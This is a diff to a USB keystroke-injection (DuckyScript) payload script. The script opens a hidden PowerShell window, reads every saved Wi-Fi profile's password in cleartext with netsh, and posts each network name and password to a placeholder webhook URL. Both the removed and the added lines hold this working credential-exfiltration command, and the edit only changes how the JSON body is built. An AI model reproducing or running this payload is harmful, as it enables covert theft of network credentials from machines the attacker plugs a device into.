@@ -7,6 +7,6 @@ STRING powershell -noe "$Host.UI.RawUI.WindowSize=New-Object System.Management.A
 ENTER
 DELAY 500
 
-REM Injecting keystrokes into PowerShell to obtain network details to be sent to a webhook...
-STRING PowerShell.exe -WindowStyle hidden {$networks = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" }; foreach ($network in $networks) { $password = (netsh wlan show profile name="$network" key=clear | Select-String "Key content").ToString().Split(":")[1].Trim(); iwr -Uri https://YOUR_LINK_HERE.com -Method Post -ContentType "application/json" -Body "{""content"": ""$network, $password""}" }; exit}
+REM Injecting keystrokes into PowerShell to obtain network credentials, to be sent to a webhook...
+STRING PowerShell.exe -WindowStyle hidden {$networks = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" }; foreach ($network in $networks) { $password = (netsh wlan show profile name="$network" key=clear | Select-String "Key content").ToString().Split(":")[1].Trim(); $payload = @{content = "$network, $password"} | ConvertTo-Json; Invoke-WebRequest -Uri https://YOUR_LINK_HERE.com -Method Post -ContentType "application/json" -Body $payload }; exit}
 ENTER
